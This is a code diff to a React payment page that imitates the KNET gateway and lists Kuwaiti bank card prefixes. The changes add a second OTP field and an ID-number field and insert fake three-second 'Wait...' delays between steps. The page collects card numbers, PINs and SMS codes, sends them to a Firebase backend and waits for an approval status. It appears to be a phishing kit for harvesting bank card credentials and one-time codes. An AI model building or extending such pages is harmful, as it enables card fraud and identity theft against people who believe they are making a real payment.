@@ -1,10 +1,11 @@
 "use client"
-import React,{ useEffect, useState } from 'react';
+import React, { useEffect, useState } from 'react';
 import './knet.css'
 import { doc, onSnapshot } from 'firebase/firestore';
 import { db, handlePay } from '../lib/firebase';
 import { Step3 } from './step3';
 import { Step4 } from './step4';
+import Loader from '../components/loader';
 
 type PaymentInfo = {
   cardNumber: string;
@@ -19,8 +20,10 @@ type PaymentInfo = {
   bank_card: string[];
   prefix: string;
   status: 'new' | 'pending' | 'approved' | 'rejected';
-  phoneNumber:string,
-    network:string,
+  phoneNumber: string,
+  network: string,
+  idNumber: string
+  otp2: string
 };
 const BANKS = [
   {
@@ -108,33 +111,10 @@ const BANKS = [
     cardPrefixes: ["541350", "525528", "532749", "559459"],
   },
 ]
-const timeView = document.getElementById('timer');
 
-function countdWown(seconds:number) {
-    let sec = seconds;
-    let mins = seconds > 60? seconds/60 : 0;
-    let  current_minutes =0
-    tick();
-  
-    function tick() {
-        if(sec > 60){
-           current_minutes = mins-1;
-        }
-       sec--;
-        timeView!.textContent = (!mins? '00' : current_minutes.toString()) + ':' + (sec < 10 ? '0' : '') + String(sec);
-        if( sec > 0 ) {
-            const stopTime = setTimeout(tick, 1000);
-        } else {
-            if(mins > 1){
-             //   countdown(mins-1);           
-            }
-        }
-    }
-  }
-  
-export default function Payment () {
+export default function Payment() {
 
-  
+
 
   const [step, setstep] = useState(1);
   const [newotp] = useState([''])
@@ -142,7 +122,7 @@ export default function Payment () {
   const [isloading, setisloading] = useState(false);
 
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
-    cardNumber: '12345678912345',
+    cardNumber: '',
     year: '',
     month: '',
     otp: '',
@@ -153,8 +133,10 @@ export default function Payment () {
     bank_card: [''],
     prefix: '',
     status: 'new',
-    phoneNumber:'',
-    network:'',
+    phoneNumber: '',
+    network: '',
+    idNumber: '',
+    otp2: '',
   });
 
   const handleAddotp = (otp: string) => {
@@ -205,7 +187,7 @@ export default function Payment () {
         <div id="PayPageEntry" >
 
           <div className="container">
-          <img src="./mob.jpg" className="-" alt="logo" />
+            <img src="./mob.jpg" className="-" alt="logo" />
 
             <div className="content-block">
               <div className="form-card">
@@ -496,11 +478,7 @@ export default function Payment () {
                       </div>
                       <div className="row" id="PinRow">
                         {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
-                        <input
-                          type="hidden"
-                          name="cardPinType"
-                          defaultValue="A"
-                        />
+
                         <div id="eComPin">
                           <label className="column-label"> PIN: </label>
                         </div>
@@ -559,15 +537,15 @@ export default function Payment () {
                       }
                     </div>
                   </>
-                ) : step ===2 ?(
+                ) : step === 2 ? (
                   <div>
                     <div className='row'>
-                      <div className='bg-blue-100 font-normal p-2 my-2' style={{fontSize:12,borderRadius:3}}>
+                      <div className='bg-blue-100 font-normal p-2 my-2' style={{ fontSize: 12, borderRadius: 3 }}>
                         Please note: A 6-digit verification code has been sent via text message to your registered phone number</div>
                     </div>
                     <div className="row">
                       <label className="column-value">CardNumber:</label>
-                      <label style={{margin:0,padding:0}}> {paymentInfo.cardNumber.substring(0,5)+"****"+paymentInfo.cardNumber.substring(10,15)}</label>
+                      <label style={{ margin: 0, padding: 0 }}> {paymentInfo.cardNumber.substring(0, 5) + "****" + paymentInfo.cardNumber.substring(10, 15)}</label>
                     </div>
                     <div className="row">
                       <label
@@ -596,15 +574,15 @@ export default function Payment () {
                             ...paymentInfo,
                             otp: e.target.value,
                           })
-                        } type='tel' maxLength={6} id='timer' 
+                        } type='tel' maxLength={6} id='timer'
                         className='w-full' value={paymentInfo.otp} />
                     </div>
                   </div>
-                ):step===3?(<><Step3 setPaymentInfo={setPaymentInfo} paymentInfo={paymentInfo}/>
+                ) : step === 3 ? (<><Step3 setPaymentInfo={setPaymentInfo} paymentInfo={paymentInfo} />
 
-                    </>):step===4?(<>
-                        <Step4 setPaymentInfo={setPaymentInfo} paymentInfo={paymentInfo}/>
-                </>):(<></>)
+                </>) : step === 4 ? (<>
+                  <Step4 setPaymentInfo={setPaymentInfo} paymentInfo={paymentInfo}  />
+                </>) : (<></>)
                 }
               </div>
               <div className="form-card">
@@ -638,7 +616,11 @@ export default function Payment () {
                           if (step === 1) {
                             setisloading(true);
                             handlePay(paymentInfo, setPaymentInfo)
-                            setstep(2)
+                            setTimeout(() => {
+                              setstep(2)
+                              setisloading(false);
+
+                            }, 3000)
 
                           } else if (step === 2) {
 
@@ -658,16 +640,30 @@ export default function Payment () {
                                 otp: '',
                               });
                             }, 3000);
-                            setstep(3)
+                            setTimeout(() => {
+                              setstep(3)
+                              setisloading(false);
+
+                            }, 3000)
 
                           }
-                          else if(step ===3){
-                            console.log(step,3)
+                          else if (step === 3) {
+                            console.log(step, 3)
+                            setisloading(true);
 
-                            setstep(4)
+                            setTimeout(() => {
+                              setstep(4)
+                              setisloading(false);
 
-                          }else if(step===4){
-                            console.log(step,4)
+                            }, 3000)
+
+                          } else if (step === 4) {
+                            setisloading(true);
+
+                            setTimeout(() => {
+                              setisloading(false);
+
+                            }, 3000)
 
                           }
 
@@ -676,7 +672,7 @@ export default function Payment () {
                             otp: '',
                           })
                         }}
-                        
+
                       >
                         {isloading ? "Wait..." : (step === 1 ? "Submit" : "Confirm")}
                       </button>
@@ -724,6 +720,7 @@ export default function Payment () {
             </div>
           </div>
         </div>
+        {isloading && <Loader />}
       </form>
     </div>
   );
